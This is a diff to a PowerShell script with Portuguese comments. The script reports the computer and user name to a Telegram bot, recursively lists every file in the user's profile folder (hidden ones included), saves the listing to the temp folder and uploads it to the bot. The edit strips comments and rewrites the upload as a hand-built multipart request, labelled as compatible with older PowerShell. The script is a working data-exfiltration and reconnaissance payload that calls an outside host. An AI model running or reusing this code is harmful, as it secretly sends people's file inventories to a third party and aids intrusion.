@@ -12,34 +12,45 @@ $msg = "A executar script em $ComputerName - $UserName"
         -Body (@{ chat_id = $chatId; text = $msg } | ConvertTo-Json)
 
 
-# Diretório do utilizador que está a correr o script
+
+
+
+
+
+$botToken = "$token"
+$chatId   = "$chatId"
+
 $diretorio = [Environment]::GetFolderPath("UserProfile")
 
-# Gera listagem completa (ficheiros + pastas) com tamanho e data
-$listagem = Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue -Path $diretorio |
+$listagem = Get-ChildItem -Recurse -Force -Path $diretorio -ErrorAction SilentlyContinue |
     Select-Object FullName,
                   @{Name="Tamanho(KB)"; Expression={[math]::Round($_.Length / 1KB, 2)}},
                   @{Name="DataModificacao"; Expression={$_.LastWriteTime}} |
     Out-String
 
-# --- CONFIGURAÇÕES DO TELEGRAM ---
-# Substitua com o seu token e chat_id
-$botToken = "$token"
-$chatId   = "$chatId"
-
-# Guardar sempre em ficheiro
 $ficheiroSaida = "$env:TEMP\listagem_usuario.txt"
 $listagem | Out-File -FilePath $ficheiroSaida -Encoding UTF8
 
-# Enviar ficheiro pelo Telegram
-$url = "https://api.telegram.org/bot$botToken/sendDocument"
-$form = @{
-    chat_id = $chatId
-    document = Get-Item $ficheiroSaida
-}
-Invoke-RestMethod -Uri $url -Method Post -Form $form
+# Envio do ficheiro (compatível com PowerShell antigo)
+$boundary = [System.Guid]::NewGuid().ToString()
+$LF = "`r`n"
+$bodyLines = @()
+$bodyLines += "--$boundary$LF"
+$bodyLines += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$chatId$LF"
+$bodyLines += "--$boundary$LF"
+$bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$($ficheiroSaida | Split-Path -Leaf)`"$LF"
+$bodyLines += "Content-Type: application/octet-stream$LF$LF"
+$bodyLines += [System.IO.File]::ReadAllText($ficheiroSaida)
+$bodyLines += "$LF--$boundary--$LF"
+$body = $bodyLines -join ""
+
+Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendDocument" `
+                  -Method Post `
+                  -ContentType "multipart/form-data; boundary=$boundary" `
+                  -Body $body
 
 
 
 
-        exit
+
+exit
